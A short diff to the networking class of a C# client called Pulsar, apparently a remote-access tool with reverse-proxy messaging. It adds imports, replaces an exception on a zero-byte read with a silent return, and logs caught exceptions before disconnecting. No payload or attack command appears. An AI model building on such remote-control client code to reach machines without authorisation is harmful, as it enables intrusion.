@@ -6,6 +6,8 @@ using Pulsar.Common.Messages.ReverseProxy;
 using Pulsar.Common.Networking;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Security;
@@ -317,7 +319,7 @@ namespace Pulsar.Client.Networking
                 bytesTransferred = _stream.EndRead(result);
 
                 if (bytesTransferred <= 0)
-                    throw new Exception("no bytes transferred");
+                    return;
             }
             catch (NullReferenceException)
             {
@@ -567,6 +569,7 @@ namespace Pulsar.Client.Networking
             }
             catch (Exception ex)
             {
+                Debug.WriteLine($"Exception: {ex.Message}");
                 Disconnect();
                 SendCleanup(true);
             }
